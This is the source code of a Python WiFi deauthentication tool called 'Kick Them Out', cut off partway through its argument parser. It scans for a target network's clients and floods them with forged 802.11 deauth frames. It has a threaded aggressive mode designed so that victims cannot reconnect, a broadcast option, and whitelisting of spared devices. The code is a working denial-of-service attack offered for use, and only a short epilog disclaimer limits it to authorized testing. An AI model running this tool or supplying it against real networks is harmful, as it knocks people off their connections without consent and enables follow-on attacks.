#!/usr/bin/env python3
"""
KTO — Kick Them Out  v1
WiFi deauthentication tool.

Kicks all connected devices from a target network, except whitelisted ones.
Supports threaded aggressive mode: scan and deauth run in parallel so clients
never get a breathing window to reconnect.

Requirements : scapy, aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng)
Usage        : sudo python3 kto.py -i wlan0 -t "MyNetwork" [options]

"""

import argparse
import os
import re
import sys
import subprocess
import time
import signal
import shutil
import tempfile
import threading
from pathlib import Path
from collections import defaultdict
from datetime import datetime

# ── Scapy ──────────────────────────────────────────────────────────────────
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
except ImportError:
    print("[-] scapy not found.  pip install scapy")
    sys.exit(1)


# ── Terminal colors ─────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

_log_lock = threading.Lock()

def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")

def info(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.CYAN}[*]{C.RESET} {msg}")

def good(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.GREEN}[+]{C.RESET} {msg}")

def warn(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.YELLOW}[~]{C.RESET} {msg}")

def bad(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.RED}[-]{C.RESET} {msg}")

def kick(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.RED}{C.BOLD}[!]{C.RESET} {msg}")


# ── OUI vendor lookup ───────────────────────────────────────────────────────
_OUI: dict[str, str] = {
    # Apple
    "00:03:93": "Apple",        "00:0A:27": "Apple",
    "00:0A:95": "Apple",        "00:11:24": "Apple",
    "00:14:51": "Apple",        "00:16:CB": "Apple",
    "00:17:F2": "Apple",        "00:19:E3": "Apple",
    "00:1B:63": "Apple",        "00:1C:B3": "Apple",
    "00:1D:4F": "Apple",        "00:1E:52": "Apple",
    "00:1E:C2": "Apple",        "00:1F:5B": "Apple",
    "00:1F:F3": "Apple",        "00:21:E9": "Apple",
    "00:22:41": "Apple",        "00:23:12": "Apple",
    "00:23:32": "Apple",        "00:23:6C": "Apple",
    "00:23:DF": "Apple",        "00:24:36": "Apple",
    "00:25:00": "Apple",        "00:25:4B": "Apple",
    "00:25:BC": "Apple",        "00:26:08": "Apple",
    "00:26:4A": "Apple",        "00:26:B9": "Apple",
    "00:26:BB": "Apple",        "04:0C:CE": "Apple",
    "04:15:52": "Apple",        "04:1E:64": "Apple",
    "04:26:65": "Apple",        "04:48:9A": "Apple",
    "04:54:53": "Apple",        "04:D3:CF": "Apple",
    "08:00:07": "Apple",        "08:6D:41": "Apple",
    "08:70:45": "Apple",        "08:74:02": "Apple",
    "0C:30:21": "Apple",        "0C:3E:9F": "Apple",
    "0C:4D:E9": "Apple",        "0C:77:1A": "Apple",
    "0C:BC:9F": "Apple",        "10:1C:0C": "Apple",
    "10:40:F3": "Apple",        "10:9A:DD": "Apple",
    "10:DD:B1": "Apple",        "14:10:9F": "Apple",
    "14:5A:05": "Apple",        "14:8F:C6": "Apple",
    "14:99:E2": "Apple",        "18:20:32": "Apple",
    "18:34:51": "Apple",        "18:65:90": "Apple",
    "18:9E:FC": "Apple",        "18:AF:61": "Apple",
    "18:E7:F4": "Apple",        "1C:1A:C0": "Apple",
    "1C:36:BB": "Apple",        "1C:5C:F2": "Apple",
    "1C:AB:A7": "Apple",        "20:78:F0": "Apple",
    "20:A2:E4": "Apple",        "20:C9:D0": "Apple",
    "24:A0:74": "Apple",        "24:AB:81": "Apple",
    "24:E3:14": "Apple",        "28:0B:5C": "Apple",
    "28:37:37": "Apple",        "28:6A:B8": "Apple",
    "28:A0:2B": "Apple",        "28:CF:DA": "Apple",
    "28:CF:E9": "Apple",        "28:E0:2C": "Apple",
    "2C:1F:23": "Apple",        "2C:20:0B": "Apple",
    "2C:61:F6": "Apple",        "2C:B4:3A": "Apple",
    "2C:F0:A2": "Apple",        "30:10:B3": "Apple",
    "30:35:AD": "Apple",        "30:90:AB": "Apple",
    "30:F7:C5": "Apple",        "34:08:BC": "Apple",
    "34:15:9E": "Apple",        "34:36:3B": "Apple",
    "34:51:C9": "Apple",        "34:A3:95": "Apple",
    "34:AB:37": "Apple",        "34:C0:59": "Apple",
    "38:0F:4A": "Apple",        "38:48:4C": "Apple",
    "38:71:DE": "Apple",        "38:C9:86": "Apple",
    "3C:07:54": "Apple",        "3C:15:C2": "Apple",
    "3C:D0:F8": "Apple",        "3C:E0:72": "Apple",
    # Samsung
    "00:00:F0": "Samsung",      "00:02:78": "Samsung",
    "00:07:AB": "Samsung",      "00:12:47": "Samsung",
    "00:15:99": "Samsung",      "00:17:C9": "Samsung",
    "00:17:D5": "Samsung",      "00:21:19": "Samsung",
    "00:23:39": "Samsung",      "00:24:54": "Samsung",
    "00:24:91": "Samsung",      "00:25:38": "Samsung",
    "00:26:37": "Samsung",      "00:E0:64": "Samsung",
    "08:08:C2": "Samsung",      "08:D4:0C": "Samsung",
    "0C:14:20": "Samsung",      "10:1D:C0": "Samsung",
    "10:30:47": "Samsung",      "10:D5:42": "Samsung",
    "14:89:FD": "Samsung",      "18:22:7E": "Samsung",
    "1C:62:B8": "Samsung",      "1C:AF:05": "Samsung",
    "20:13:E0": "Samsung",      "20:64:32": "Samsung",
    "24:4B:03": "Samsung",      "24:92:0E": "Samsung",
    "28:27:BF": "Samsung",      "2C:AE:2B": "Samsung",
    "30:19:66": "Samsung",      "38:2D:E8": "Samsung",
    "3C:62:00": "Samsung",      "40:0E:85": "Samsung",
    # Google / Nest
    "00:1A:11": "Google",       "08:9E:08": "Google",
    "1C:F2:9A": "Google",       "20:DF:B9": "Google",
    "48:D6:D5": "Google",       "54:60:09": "Google",
    "94:EB:2C": "Google",       "A4:77:33": "Google",
    "F4:F5:D8": "Google",       "F8:8F:CA": "Google",
    # Amazon
    "00:BB:3A": "Amazon",       "04:A2:22": "Amazon",
    "0C:47:C9": "Amazon",       "34:D2:70": "Amazon",
    "40:B4:CD": "Amazon",       "44:65:0D": "Amazon",
    "68:54:FD": "Amazon",       "74:C2:46": "Amazon",
    "84:D6:D0": "Amazon",       "A0:02:DC": "Amazon",
    "B4:7C:9C": "Amazon",       "F0:27:2D": "Amazon",
    "FC:A6:67": "Amazon",
    # Huawei
    "00:9A:CD": "Huawei",       "04:02:1F": "Huawei",
    "04:C0:6F": "Huawei",       "04:F9:38": "Huawei",
    "08:19:A6": "Huawei",       "10:1B:54": "Huawei",
    "1C:8E:5C": "Huawei",       "20:F3:A3": "Huawei",
    "28:31:52": "Huawei",       "2C:AB:25": "Huawei",
    "34:6B:D3": "Huawei",       "34:A8:4E": "Huawei",
    "38:37:8B": "Huawei",       "40:4D:8E": "Huawei",
    # Xiaomi
    "00:EC:0A": "Xiaomi",       "04:CF:8C": "Xiaomi",
    "08:7A:4C": "Xiaomi",       "0C:1D:AF": "Xiaomi",
    "10:2A:B3": "Xiaomi",       "14:F6:5A": "Xiaomi",
    "18:59:36": "Xiaomi",       "28:6C:07": "Xiaomi",
    "34:80:B3": "Xiaomi",       "38:A4:ED": "Xiaomi",
    "4C:49:E3": "Xiaomi",       "50:64:2B": "Xiaomi",
    "58:44:98": "Xiaomi",       "5C:02:14": "Xiaomi",
    "64:09:80": "Xiaomi",       "64:B4:73": "Xiaomi",
    "68:DF:DD": "Xiaomi",       "6C:5A:B0": "Xiaomi",
    "74:51:BA": "Xiaomi",       "78:11:DC": "Xiaomi",
    "78:02:F8": "Xiaomi",       "7C:1D:D9": "Xiaomi",
    "8C:BE:BE": "Xiaomi",       "94:FB:A7": "Xiaomi",
    "98:FA:E3": "Xiaomi",       "9C:99:A0": "Xiaomi",
    "A0:86:C6": "Xiaomi",       "AC:C1:EE": "Xiaomi",
    "B0:E2:35": "Xiaomi",       "C4:0B:CB": "Xiaomi",
    "D4:97:0B": "Xiaomi",       "F0:B4:29": "Xiaomi",
    "F4:8B:32": "Xiaomi",       "F8:A4:5F": "Xiaomi",
    "FC:64:BA": "Xiaomi",
    # Sony
    "00:13:A9": "Sony",         "00:19:4E": "Sony",
    "00:1A:80": "Sony",         "00:1D:0D": "Sony",
    "00:24:BE": "Sony",         "00:EB:2D": "Sony",
    "10:4F:58": "Sony",         "30:17:C8": "Sony",
    "3C:01:EF": "Sony",         "40:2B:A1": "Sony",
    "5C:F9:38": "Sony",         "70:2A:D5": "Sony",
    "AC:9B:0A": "Sony",         "B4:52:7E": "Sony",
    "D8:D4:3C": "Sony",         "E0:AE:5E": "Sony",
    # Intel
    "00:02:B3": "Intel",        "00:03:47": "Intel",
    "00:04:23": "Intel",        "00:07:E9": "Intel",
    "00:0C:F1": "Intel",        "00:0E:0C": "Intel",
    "00:0E:35": "Intel",        "00:11:11": "Intel",
    "00:12:F0": "Intel",        "00:13:02": "Intel",
    "00:13:20": "Intel",        "00:13:CE": "Intel",
    "00:13:E8": "Intel",        "00:15:00": "Intel",
    "00:15:17": "Intel",        "00:16:6F": "Intel",
    "00:16:76": "Intel",        "00:16:EA": "Intel",
    "00:16:EB": "Intel",        "00:18:DE": "Intel",
    # Realtek
    "00:01:6C": "Realtek",      "00:E0:4C": "Realtek",
    "08:BE:AC": "Realtek",
    # TP-Link
    "00:27:19": "TP-Link",      "14:CC:20": "TP-Link",
    "18:D6:C7": "TP-Link",      "1C:3B:F3": "TP-Link",
    "20:DC:E6": "TP-Link",      "24:A4:3C": "TP-Link",
    "28:2C:B2": "TP-Link",      "2C:D0:5A": "TP-Link",
    "30:B5:C2": "TP-Link",      "3C:46:D8": "TP-Link",
    "50:C7:BF": "TP-Link",      "54:C8:0F": "TP-Link",
    "60:32:B1": "TP-Link",      "60:E3:27": "TP-Link",
    "64:70:02": "TP-Link",      "6C:5C:14": "TP-Link",
    "74:EA:3A": "TP-Link",      "78:8A:20": "TP-Link",
    "7C:39:56": "TP-Link",      "80:35:C1": "TP-Link",
    "84:16:F9": "TP-Link",      "88:D7:F6": "TP-Link",
    "90:F6:52": "TP-Link",      "98:DA:C4": "TP-Link",
    "A0:F3:C1": "TP-Link",      "A8:40:41": "TP-Link",
    "AC:84:C6": "TP-Link",      "B0:95:75": "TP-Link",
    "B4:B0:24": "TP-Link",      "C0:4A:00": "TP-Link",
    "D8:07:B6": "TP-Link",      "DC:FE:18": "TP-Link",
    "E8:DE:27": "TP-Link",      "EC:08:6B": "TP-Link",
    "F4:F2:6D": "TP-Link",      "F8:1A:67": "TP-Link",
    # Netgear
    "00:09:5B": "Netgear",      "00:0F:B5": "Netgear",
    "00:14:6C": "Netgear",      "00:1B:2F": "Netgear",
    "00:1E:2A": "Netgear",      "00:1F:33": "Netgear",
    "00:22:3F": "Netgear",      "00:24:B2": "Netgear",
    "00:26:F2": "Netgear",      "20:4E:7F": "Netgear",
    "2C:30:33": "Netgear",      "2C:B0:5D": "Netgear",
    "44:94:FC": "Netgear",      "4C:60:DE": "Netgear",
    # Asus
    "00:08:A1": "Asus",         "00:0C:6E": "Asus",
    "00:0E:A6": "Asus",         "00:11:2F": "Asus",
    "00:13:D4": "Asus",         "00:15:F2": "Asus",
    "00:17:31": "Asus",         "00:18:F3": "Asus",
    "00:1A:92": "Asus",         "00:1B:FC": "Asus",
    "00:1D:60": "Asus",         "00:1E:8C": "Asus",
    "00:1F:C6": "Asus",         "00:22:15": "Asus",
    "00:23:54": "Asus",         "00:24:8C": "Asus",
    "00:26:18": "Asus",         "04:92:26": "Asus",
    # LG
    "00:1C:62": "LG",           "00:1E:75": "LG",
    "00:1F:6B": "LG",           "00:22:A9": "LG",
    "00:24:83": "LG",           "00:26:E2": "LG",
    "10:68:3F": "LG",           "1C:08:C1": "LG",
    # OnePlus
    "AC:37:43": "OnePlus",      "BC:28:A3": "OnePlus",
    # Microsoft / Xbox
    "00:50:F2": "Microsoft",    "28:18:78": "Microsoft",
    "48:DF:37": "Microsoft",    "60:45:BD": "Microsoft",
    "7C:1E:52": "Microsoft",    "98:5F:D3": "Microsoft",
    "C0:33:5E": "Microsoft",
    # Nintendo
    "00:09:BF": "Nintendo",     "00:16:56": "Nintendo",
    "00:17:AB": "Nintendo",     "00:19:1D": "Nintendo",
    "00:1A:E9": "Nintendo",     "00:1B:EA": "Nintendo",
    "00:1C:BE": "Nintendo",     "00:1E:35": "Nintendo",
    "00:1F:32": "Nintendo",     "00:21:47": "Nintendo",
    "00:22:AA": "Nintendo",     "00:24:44": "Nintendo",
    "E0:E7:51": "Nintendo",
    # VirtualBox / VMware (useful for lab environments)
    "08:00:27": "VirtualBox",
    "00:0C:29": "VMware",       "00:50:56": "VMware",
    "00:05:69": "VMware",
}

MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')


def oui_vendor(mac: str) -> str:
    return _OUI.get(mac.upper()[:8], "")

def vendor_tag(mac: str) -> str:
    v = oui_vendor(mac)
    return f" {C.DIM}({v}){C.RESET}" if v else ""

def normalize_mac(mac: str) -> str:
    return mac.upper().strip()

def validate_mac(mac: str) -> bool:
    return bool(MAC_RE.match(mac))


# ── System helpers ──────────────────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        bad("Must be run as root. Use sudo.")
        sys.exit(1)

def check_dependency(tool: str):
    if not shutil.which(tool):
        bad(f"Required tool not found: {tool}")
        bad("  sudo apt install aircrack-ng")
        sys.exit(1)

def set_channel(interface: str, channel: int):
    try:
        subprocess.run(
            ["iwconfig", interface, "channel", str(channel)],
            check=True, capture_output=True,
        )
        good(f"Channel locked to {channel}")
    except subprocess.CalledProcessError as e:
        warn(f"Could not lock channel {channel}: {e.stderr.decode().strip()}")


# FIX 1: robust airmon-ng output parsing
# Old format: "monitor mode enabled (wlan0mon)"  → captured by paren regex
# New format: "monitor mode enabled on wlan0mon" → captured by 'on' regex
def enable_monitor_mode(iface: str) -> str:
    info(f"Enabling monitor mode on {iface}…")
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(
        ["airmon-ng", "start", iface],
        capture_output=True, text=True,
    )
    for line in result.stdout.splitlines():
        low = line.lower()
        if "monitor mode" in low and ("enabled" in low or "already" in low):
            # new airmon-ng: "monitor mode enabled on wlan0mon"
            m = re.search(r'enabled on (\w+)', low)
            if m:
                mon = m.group(1)
                good(f"Monitor interface: {mon}")
                return mon
            # old airmon-ng: "monitor mode enabled (wlan0mon)"
            m = re.search(r'\((\w+)\)', line)
            if m:
                mon = m.group(1)
                good(f"Monitor interface: {mon}")
                return mon
    mon = iface + "mon"
    warn(f"Could not parse monitor interface name — assuming {mon}")
    return mon

def disable_monitor_mode(mon_iface: str):
    info(f"Restoring {mon_iface} to managed mode…")
    # Try to stop monitor mode – don't crash on any error
    try:
        subprocess.run(["airmon-ng", "stop", mon_iface],
                       capture_output=True, check=False)
    except Exception as e:
        warn(f"airmon-ng stop failed: {e}")

    # Restart network manager using the most common init commands.
    # We try several and ignore all failures, so the cleanup never crashes.
    for cmd in (
        ["service", "NetworkManager", "start"],
        ["systemctl", "restart", "NetworkManager"],
        ["service", "network-manager", "start"],
    ):
        try:
            subprocess.run(cmd, capture_output=True, check=False)
            break  # exit loop on first success
        except FileNotFoundError:
            continue
        except Exception:
            continue


# ── Core ────────────────────────────────────────────────────────────────────

class KTO:
    def __init__(
        self,
        interface: str,
        ssid: str,
        whitelist: set[str],
        channel: int | None,
        deauth_count: int,
        interval: float,
        scan_duration: float,
        deauth_delay: float,        # per-client delay in aggressive mode
        broadcast: bool,
        use_aireplay: bool,
        aggressive: bool,
        scan_only: bool,
        auto_monitor: bool,
        auto_bssid: bool,           # auto-pick strongest when SSID has multiple APs
        reason: int,                # 802.11 deauth reason code
    ):
        self.interface     = interface
        self.ssid          = ssid
        self.whitelist     = whitelist
        self.channel       = channel
        self.deauth_count  = deauth_count
        self.interval      = interval
        self.scan_duration = scan_duration
        self.deauth_delay  = deauth_delay
        self.broadcast     = broadcast
        self.use_aireplay  = use_aireplay
        self.aggressive    = aggressive
        self.scan_only     = scan_only
        self.auto_monitor  = auto_monitor
        self.auto_bssid    = auto_bssid
        self.reason        = reason

        self.target_bssid: str | None   = None
        self.target_channel: int | None = channel
        self._mon_created: bool         = False

        # Thread-shared state
        self._clients: set[str]      = set()
        self._clients_lock           = threading.Lock()
        self._seen: set[str]         = set()

        # stats has its own lock so the signal handler
        # can read it safely while _deauth_loop is writing it
        self._stats: dict[str, int]  = defaultdict(int)
        self._stats_lock             = threading.Lock()

        self._running                = threading.Event()
        self._running.set()

        self._tmpdir = tempfile.mkdtemp(prefix="kto_")
        conf.iface   = interface
        signal.signal(signal.SIGINT, self._graceful_exit)

    # ── Cleanup ─────────────────────────────────────────────────────────────

    def _cleanup(self):
        # Always remove temp files – ignore any errors
        try:
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass

        # Restore interface only if we created a monitor interface
        if self._mon_created and self.auto_monitor:
            try:
                disable_monitor_mode(self.interface)
            except Exception:
                pass

    def _graceful_exit(self, sig, frame):
        try:
            print()
            self._running.clear()
            info("Stopping KTO.")
            # (cont.): read stats under lock
            with self._stats_lock:
                stats_copy = dict(self._stats)
            if stats_copy:
                info("Session summary:")
                # show total bursts per client in a tidy table
                header = f"    {'MAC':<20} {'Vendor':<12} {'Bursts':>6}"
                print(f"{C.DIM}{header}{C.RESET}")
                print(f"{C.DIM}    {'-'*42}{C.RESET}")
                for mac, count in sorted(stats_copy.items(), key=lambda x: -x[1]):
                    vendor = oui_vendor(mac) or "—"
                    print(f"    {C.BOLD}{mac:<20}{C.RESET} {C.DIM}{vendor:<12}{C.RESET} {C.YELLOW}{count:>6}{C.RESET}")
        finally:
            # Always run cleanup, even if the summary printing fails
            self._cleanup()
            sys.exit(0)

    # ── airodump-ng wrapper ──────────────────────────────────────────────────

    def _run_airodump(self, extra_args: list[str], duration: float) -> Path:
        out_base = Path(self._tmpdir) / "scan"
        for f in Path(self._tmpdir).glob("scan*"):
            f.unlink(missing_ok=True)

        proc = subprocess.Popen(
            ["airodump-ng", "--output-format", "csv", "-w", str(out_base)]
            + extra_args + [self.interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        deadline = time.monotonic() + duration
        # (supports non-integer scan_duration, and bails early on stop)
        while time.monotonic() < deadline and self._running.is_set():
            time.sleep(0.25)
        proc.terminate()
        proc.wait()
        return out_base

    # ── Target discovery ─────────────────────────────────────────────────────

    # parse the AP section of an airodump CSV and return all matching rows
    # as a list of dicts so find_target can handle multi-AP SSIDs.
    def _parse_ap_csv(self, csv_file: Path) -> list[dict]:
        results = []
        if not csv_file.exists():
            return results
        with csv_file.open(errors="replace") as f:
            for line in f:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid = parts[0]
                chan  = parts[3]
                # column 8 = Privacy (e.g. "WPA2"), column 14 = ESSID
                # airodump CSV: BSSID, First time seen, Last time seen, channel,
                #   Speed, Privacy, Cipher, Authentication, Power, # beacons,
                #   # IV, LAN IP, ID-length, ESSID, Key
                privacy = parts[5] if len(parts) > 5 else ""
                power   = parts[8] if len(parts) > 8 else "-100"
                essid   = parts[13] if len(parts) > 13 else ""
                # detect MFPR/MFPC flags in the Authentication column
                auth    = parts[7] if len(parts) > 7 else ""
                pmf     = "MGT" in auth or "OWE" in auth or "SAE" in auth
                if ":" in bssid and essid == self.ssid:
                    try:
                        pwr = int(power)
                    except ValueError:
                        pwr = -100
                    try:
                        ch = int(chan)
                    except ValueError:
                        ch = None
                    results.append({
                        "bssid":   normalize_mac(bssid),
                        "channel": ch,
                        "power":   pwr,
                        "privacy": privacy,
                        "pmf":     pmf,
                    })
        return results

    def find_target(self) -> bool:
        info(f"Scanning for SSID: {C.BOLD}{self.ssid}{C.RESET}  ({self.scan_duration:.0f} s)…")
        out_base = self._run_airodump(
            ["--essid", self.ssid],
            duration=self.scan_duration,
        )
        csv_file = Path(str(out_base) + "-01.csv")

        if not csv_file.exists():
            bad("airodump-ng produced no output. Is the interface in monitor mode?")
            return False

        matches = self._parse_ap_csv(csv_file)

        if not matches:
            bad(f"SSID '{self.ssid}' not found in scan window.")
            return False

        # multi-AP handling
        if len(matches) == 1 or self.auto_bssid:
            # auto-pick: strongest signal (least negative power value)
            chosen = max(matches, key=lambda r: r["power"])
            if len(matches) > 1:
                warn(
                    f"{len(matches)} APs share SSID '{self.ssid}'. "
                    f"Auto-selecting strongest signal (use --bssid to override)."
                )
        else:
            print()
            info(f"Multiple APs found for SSID '{self.ssid}':")
            for i, r in enumerate(matches, 1):
                pmf_tag = f"  {C.RED}[PMF]{C.RESET}" if r["pmf"] else ""
                print(
                    f"  [{i}] {C.BOLD}{r['bssid']}{C.RESET}"
                    f"  ch {r['channel']}"
                    f"  pwr {r['power']} dBm"
                    f"  {r['privacy']}"
                    f"{pmf_tag}"
                )
            print()
            while True:
                try:
                    idx = int(input(f"  Select AP [1-{len(matches)}]: ")) - 1
                    if 0 <= idx < len(matches):
                        chosen = matches[idx]
                        break
                except (ValueError, KeyboardInterrupt):
                    pass
                warn("Invalid selection, try again.")

        self.target_bssid   = chosen["bssid"]
        if not self.target_channel:
            self.target_channel = chosen["channel"]

        good(
            f"Target  {C.BOLD}{self.ssid}{C.RESET}"
            f"  BSSID {self.target_bssid}"
            f"  ch {self.target_channel}"
            f"  {chosen['privacy']}"
        )

        # PMF warning — deauths will be silently dropped by compliant clients
        if chosen["pmf"]:
            warn(
                f"{C.YELLOW}{C.BOLD}PMF/MFP detected on this AP.{C.RESET}"
                f" 802.11w-capable clients will ignore unprotected deauth frames."
                f" The PoC may have reduced effectiveness against patched clients."
            )

        return True

    # ── Client discovery ─────────────────────────────────────────────────────

    def _scan_clients_once(self) -> set[str]:
        # (cont.): uses self.scan_duration instead of hardcoded 8
        out_base = self._run_airodump(
            ["--bssid", self.target_bssid, "-c", str(self.target_channel or 6)],
            duration=self.scan_duration,
        )
        csv_file = Path(str(out_base) + "-01.csv")
        found: set[str] = set()

        if not csv_file.exists():
            return found

        in_clients = False
        with csv_file.open(errors="replace") as f:
            for line in f:
                if "Station MAC" in line:
                    in_clients = True
                    continue
                if not in_clients:
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 6:
                    continue
                mac   = normalize_mac(parts[0])
                assoc = normalize_mac(parts[5]) if len(parts) > 5 else ""
                if (
                    validate_mac(mac)
                    and mac != self.target_bssid
                    and assoc == self.target_bssid
                ):
                    found.add(mac)
        return found

    # ── Packet construction ──────────────────────────────────────────────────

    def _build_deauth(self, dst: str, src: str):
        """
        Proper 802.11 management frame.
          addr1 = DA  (receiver)
          addr2 = SA  (transmitter)
          addr3 = BSSID  ← always the AP MAC, regardless of direction
        """
        return (
            RadioTap()
            / Dot11(
                type=0, subtype=12,
                addr1=dst,
                addr2=src,
                addr3=self.target_bssid,
            )
            # configurable reason code via self.reason
            / Dot11Deauth(reason=self.reason)
        )

    def _deauth_scapy(self, client: str):
        bssid = self.target_bssid
        kw    = dict(iface=self.interface, count=self.deauth_count, inter=0.05, verbose=False)

        # AP → Client
        sendp(self._build_deauth(dst=client, src=bssid), **kw)
        # Client → AP
        sendp(self._build_deauth(dst=bssid,  src=client), **kw)

        if self.broadcast:
            sendp(self._build_deauth(dst="ff:ff:ff:ff:ff:ff", src=bssid), **kw)

    def _deauth_aireplay(self, client: str):
        subprocess.run(
            ["aireplay-ng", "--deauth", str(self.deauth_count),
             "-a", self.target_bssid, "-c", client, self.interface],
            capture_output=True,
        )

    def _deauth(self, client: str):
        try:
            if self.use_aireplay:
                self._deauth_aireplay(client)
            else:
                self._deauth_scapy(client)
            # (cont.): increment stats under lock
            with self._stats_lock:
                self._stats[client] += 1
                burst_n = self._stats[client]
            kick(
                f"Kicked {C.BOLD}{client}{C.RESET}{vendor_tag(client)}"
                f"  (burst #{burst_n})"
            )
        except Exception as e:
            bad(f"Deauth error ({client}): {e}")

    # ── Scan thread ──────────────────────────────────────────────────────────

    def _scan_loop(self):
        sweep = 0
        while self._running.is_set():
            sweep += 1
            info(f"Sweep #{sweep}  —  scanning…")
            found = self._scan_clients_once()

            # bail early if stopped during the scan window
            if not self._running.is_set():
                break

            with self._clients_lock:
                new_ones = found - self._seen
                gone     = self._clients - found
                self._clients = found

            for mac in new_ones:
                self._seen.add(mac)
                tag = vendor_tag(mac)
                if mac in self.whitelist:
                    warn(f"Whitelisted : {mac}{tag}")
                else:
                    info(f"New client  : {C.BOLD}{mac}{C.RESET}{tag}")

            for mac in gone:
                if mac not in self.whitelist:
                    info(f"Left        : {C.DIM}{mac}{C.RESET}{vendor_tag(mac)}")

            if not found:
                warn("No clients found this sweep.")
            else:
                info(f"Active clients: {len(found)}")

            # In non-aggressive mode, deauth happens here sequentially
            if not self.aggressive and not self.scan_only:
                with self._clients_lock:
                    targets = set(self._clients)
                for mac in targets:
                    if mac not in self.whitelist and self._running.is_set():
                        self._deauth(mac)

            # Interruptible sleep before next sweep
            deadline = time.monotonic() + self.interval
            while time.monotonic() < deadline and self._running.is_set():
                time.sleep(0.25)

    # ── Deauth thread (aggressive only) ──────────────────────────────────────

    def _deauth_loop(self):
        """Hammer known clients continuously, independent of scan timing."""
        while self._running.is_set():
            with self._clients_lock:
                targets = set(self._clients)

            if not targets:
                time.sleep(0.5)
                continue

            for mac in targets:
                if not self._running.is_set():
                    break
                if mac not in self.whitelist:
                    self._deauth(mac)
                    # configurable per-client delay prevents
                    # the loop from becoming a tight busy-spin when there
                    # are few clients and also gives the NIC breathing room
                    if self.deauth_delay > 0:
                        time.sleep(self.deauth_delay)

    # ── Entry point ──────────────────────────────────────────────────────────

    def run(self):
        check_root()
        check_dependency("airodump-ng")
        if self.use_aireplay:
            check_dependency("aireplay-ng")
        if self.auto_monitor:
            check_dependency("airmon-ng")
            self.interface  = enable_monitor_mode(self.interface)
            self._mon_created = True
            conf.iface      = self.interface

        print(f"\n{C.BOLD}{C.RED}  KTO — Kick Them Out  v3.1{C.RESET}\n")
        info(f"Interface  : {self.interface}")
        info(f"Target SSID: {self.ssid}")
        if self.scan_only:
            info(f"Mode       : {C.YELLOW}SCAN ONLY{C.RESET} (passive, no deauth)")
        else:
            engine = "aireplay-ng" if self.use_aireplay else "scapy 802.11"
            agr    = f"  {C.YELLOW}[AGGRESSIVE — threaded]{C.RESET}" if self.aggressive else ""
            info(f"Deauth     : {engine}{agr}")
            info(f"Burst      : {self.deauth_count} frames / direction  (reason {self.reason})")
        if self.whitelist:
            info(f"Whitelist  : {', '.join(self.whitelist)}")
        info(f"Scan dur.  : {self.scan_duration} s   Sweep interval: {self.interval} s")
        print()

        if not self.find_target():
            self._cleanup()
            sys.exit(1)

        if self.target_channel:
            set_channel(self.interface, self.target_channel)

        info("Running. Ctrl+C to stop.\n")

        scan_t = threading.Thread(target=self._scan_loop, daemon=True, name="scan")
        scan_t.start()

        if self.aggressive and not self.scan_only:
            deauth_t = threading.Thread(target=self._deauth_loop, daemon=True, name="deauth")
            deauth_t.start()

        scan_t.join()


# ── CLI ─────────────────────────────────────────────────────────────────────

def load_whitelist(flag_value: str | None, file_path: str | None) -> set[str]:
    macs: set[str] = set()

    if flag_value:
        for raw in flag_value.split(","):
            mac = normalize_mac(raw.strip())
            if validate_mac(mac):
                macs.add(mac)
            elif raw.strip():
                warn(f"Invalid MAC in --whitelist (skipped): {raw.strip()}")

    if file_path:
        p = Path(file_path)
        if not p.exists():
            bad(f"Whitelist file not found: {file_path}")
            sys.exit(1)
        for line in p.read_text().splitlines():
            mac = normalize_mac(line.strip())
            if validate_mac(mac):
                macs.add(mac)
            elif line.strip() and not line.strip().startswith("#"):
                warn(f"Invalid line in whitelist file (skipped): {line.strip()}")

    return macs


def main():
    parser = argparse.ArgumentParser(
        description="KTO v3.1 — Kick Them Out: WiFi deauth tool for authorized pen-testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  sudo python3 kto.py -i wlan0mon -t "CorpNet"
  sudo python3 kto.py -i wlan0    -t "CorpNet" --auto-monitor
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --aggressive
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --scan-only
  sudo python3 kto.py -i wlan0mon -t "CorpNet" -w AA:BB:CC:DD:EE:FF
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --whitelist-file safe.txt
  sudo python3 kto.py -i wlan0mon -t "CorpNet" -n 10 --aireplay --broadcast
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --scan-duration 12 --delay 0.2
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --auto-bssid   # mesh / multi-AP
  sudo python3 kto.py -i wlan0mon -t "CorpNet" --reason 1     # 1=unspecified

disclaimer:
  Only use on networks you own or have explicit written permission to test.
  Unauthorized deauthentication attacks are illegal in most jurisdictions.
        """,
    )

    parser.add_argument("-i", "--interface",    required=True,
                        help="Wireless interface (monitor mode, or combine with --auto-monitor)")
    parser.add_argument("-t", "--target",       required=True,
                        help="Target WiFi SSID")
    parser.add_argument("-w", "--whitelist",    default=None,
                        help="Comma-separated MACs to spare from deauth")
    parser.add_argument("--whitelist-file",     default=None, metavar="FILE",
                        help="File of MACs to spare, one per line (# = comment)")
    parser.add_argument("-c", "--channel",      type=int, default=None,
                        help="Force a specific channel (skips auto-detect)")
    parser.add_argument("-n", "--count",        type=int, default=5,
                        help="Deauth frames per burst per direction (default: 5)")
    parser.add_argument("-s", "--sleep",        type=float, default=5.0,
